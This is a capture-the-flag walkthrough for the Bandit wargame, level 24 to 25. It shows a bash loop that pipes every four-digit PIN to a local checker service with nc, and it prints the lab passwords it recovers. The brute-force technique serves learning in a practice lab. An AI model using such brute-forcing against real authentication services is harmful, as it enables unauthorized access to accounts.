# Bandit Level 24 -> Level 25

A daemon is listening on port `30002` and will give you the password for `bandit25` if given the password for `bandit24` and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

# What is a `daemon`?

In multitasking computer operating systems, a `daemon` is a computer program that runs as a background process, rather than being under the direct control of an interactive user.

# Program being executed at port `30002`

```console
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.


bandit24@bandit:~$ echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1 | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Timeout. Exiting.
```

# Script (.sh) to run

To generate a sequence of numbers from 0000 to 9999 (4 digit combinations), 2 possible methods

1. Use Bash's Brace Expansion

   Supplied integers may be prefixed with 0 to force each term to have the same width. When either x or y begins with a zero, the shell attempts to force all generated terms to contain the same number of digits, zero-padding where necessary.

   https://unix.stackexchange.com/a/60259

```console
$ echo {08..10}
08 09 10
```

1. Use `seq` command to print a sequence of numbers with the `-w` option (for equalizing width by padding with leading zeroes)

## Script

```console
#!/bin/bash

for i in {0000..9999}
do
    echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i
done
```

# Command

```console
bandit24@bandit:~$ mkdir /tmp/lvl24
bandit24@bandit:~$ cd /tmp/lvl24
bandit24@bandit:/tmp/lvl24$ vim script.sh
bandit24@bandit:/tmp/lvl24$ cat script.sh
#!/bin/bash

for i in {0000..9999}
do
    echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i
done

bandit24@bandit:/tmp/lvl24$ ls -l
total 4
-rw-r--r-- 1 bandit24 root 88 Jun 17 11:15 script.sh
bandit24@bandit:/tmp/lvl24$ chmod u+x script.sh
bandit24@bandit:/tmp/lvl24$ ls -l
total 4
-rwxr--r-- 1 bandit24 root 88 Jun 17 11:15 script.sh

bandit24@bandit:/tmp/lvl24$ ./script.sh | nc localhost 30002
...
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```

# PASSWORD

uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
